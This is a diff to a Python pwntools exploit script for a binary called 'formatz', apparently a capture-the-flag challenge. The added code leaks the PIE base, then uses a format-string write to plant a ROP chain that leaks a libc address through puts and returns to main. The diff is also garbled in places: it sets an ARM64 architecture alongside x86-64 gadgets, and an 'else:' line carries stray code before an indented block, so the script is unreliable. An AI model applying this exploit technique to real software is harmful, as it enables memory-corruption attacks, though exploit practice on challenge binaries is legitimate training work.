@@ -31,8 +31,11 @@ print("ELF OF BINARY:")
 elf = ELF("./formatz")
 
 # Knows the context to debug in
+DEBUG = False
+if(DEBUG):
+    context.log_level = "debug"
+context.arch = "arm64"
 context.binary = elf
-context.log_level = "debug"
 
 def progEnv():
     libc = ELF('/usr/lib64/ld-linux-x86-64.so.2')      # Use local libc library
@@ -41,12 +44,12 @@ def progEnv():
     if args.LOCAL:
         libc = ELF('/usr/lib/libc-2.33.so', checksec=False)
         return process([elf.path])
-    else:
+    else: runningProc.recvuntil('0x')
         libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so', checksec=False)
         return remote(HOST, PORT), libc
     '''
 
-# Used by the autopwner as a callback function
+# Used by the autopwner as a callback function to find payload
 def exec_fmt(payload):
     p = process([elf.path])
     p.sendline(payload)
@@ -79,6 +82,24 @@ def main():
     PIELeak = runningProc.recvuntil(b"\n")
     print("PIE LEAK: ", PIELeak)        # Leak value check
     PIELeakInt = int(PIELeak, 16)
+
+    # Find base of main
+    elf.address = PIELeakInt - elf.symbols.main
+
+    # The offset to RIP is calculated as following
+    rip = GOTLeakInt + buffer + 8 # 8 = RBP length!
+    
+    # We make use of this useful gadget
+    pop_rdi = elf.address + 0x00000000000012bb # pop rdi; ret;
+
+    # This is the GOT leak location from above, want to call puts again to ensure next leak is called in ROP
+    leak_func = 'setvbuf'
+    payload = fmtstr_payload(offset, {rip: pop_rdi, rip+8: elf.got[leak_func], rip+16: elf.symbols['puts'], rip+24: elf.symbols['main']}, write_size='short')
+
+    runningProc.sendline(payload)
+    resp=runningProc.recv()
+    print(resp)
+
 
 # Execute the function main when written
 if __name__ == "__main__":
